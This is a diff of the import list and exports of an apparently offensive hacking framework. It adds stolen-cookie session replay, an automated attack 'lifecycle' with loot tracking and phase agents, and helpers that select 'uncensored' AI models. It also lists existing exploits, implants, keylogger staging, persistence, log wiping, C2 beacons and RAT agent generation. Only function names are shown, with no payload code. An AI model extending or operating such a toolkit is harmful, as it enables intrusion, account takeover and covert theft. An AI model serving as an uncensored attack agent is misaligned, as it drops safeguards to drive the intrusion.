@@ -16,6 +16,14 @@ from quantum.core.deps import check_deps
 
 from quantum.ai.supervisor import AI_Supervisor
 from quantum.ai.bootstrap import DM
+from quantum.ai.providers import (FREE_MODELS, UNCENSORED, free_models,
+                                  provider_dashboard_state,
+                                  provider_status, resolve_provider,
+                                  sync_openrouter_models,
+                                  uncensored_models)
+from quantum.overlord.lifecycle import (LIFE_CYCLE, lifecycle_dashboard_state,
+                                        lifecycle_recent_runs, loot_stats,
+                                        phase_agent, run_lifecycle)
 
 from quantum.recon.scan import ReconModule
 from quantum.recon.intelx import (intelx_build_search_url, intelx_key,
@@ -72,6 +80,10 @@ from quantum.weapons.remote_v3 import (v3_citrix_path, v3_citrixbleed,
                                        v3_vcenter_upload, v3_weblogic_console)
 
 from quantum.postexploit.killswitch import KILLSWITCH, TASKQ, kill_all_implants
+from quantum.postexploit.cookies import (cookie_hosts, cookies_dashboard_state,
+                                         delete_jar, import_jar, load_jar,
+                                         parse_netscape, replay_session,
+                                         save_jar)
 from quantum.postexploit.persistx import persistx
 from quantum.postexploit.kitlogger import stage_keylogger
 from quantum.postexploit.footprint import (footprint_wipe_posix,
@@ -167,7 +179,10 @@ __all__ = [
     "v3_log4shell", "v3_moveit_probe", "v3_panos_cmd", "v3_sambacry",
     "v3_vcenter_upload", "v3_weblogic_console", "EMOJI_REVERSE", "KILLSWITCH", "TASKQ",
     "kill_all_implants", "persistx", "stage_keylogger", "footprint_wipe_posix",
-    "footprint_wipe_windows", "DataHarvester", "auto_parse_loot", "FEDERATION",
+    "footprint_wipe_windows", "cookie_hosts", "cookies_dashboard_state",
+    "delete_jar", "import_jar", "load_jar", "parse_netscape",
+    "replay_session", "save_jar", "DataHarvester", "auto_parse_loot",
+    "FEDERATION",
     "QCLI_API", "Turbine", "decrypt_beacon", "keygen", "make_c2", "run_c2",
     "DoHC2BeaconServer", "FoxAcid", "QuantumInsert", "SwitchboardICMP",
     "CottonMouth", "OBSIDIAN_PS1", "generate_posix_agent", "doh_reverse_beacon",
@@ -178,6 +193,10 @@ __all__ = [
     "CRUNCH_NOTE", "SYMBOLS", "crunch_detect", "crunch_estimate",
     "crunch_estimate_size", "crunch_charset", "crunch_generate", "crunch_write",
     "rat_dispatch", "rat_generate_agent", "rat_fleet_snapshot",
+    "FREE_MODELS", "UNCENSORED", "free_models", "provider_dashboard_state",
+    "provider_status", "resolve_provider", "sync_openrouter_models",
+    "uncensored_models", "LIFE_CYCLE", "lifecycle_dashboard_state",
+    "lifecycle_recent_runs", "loot_stats", "phase_agent", "run_lifecycle",
     "intelx_search", "intelx_phonebook", "intelx_tools",
     "intelx_dashboard_state", "intelx_dashboard_state_full",
     "intelx_recent_queries", "intelx_build_search_url", "intelx_key",
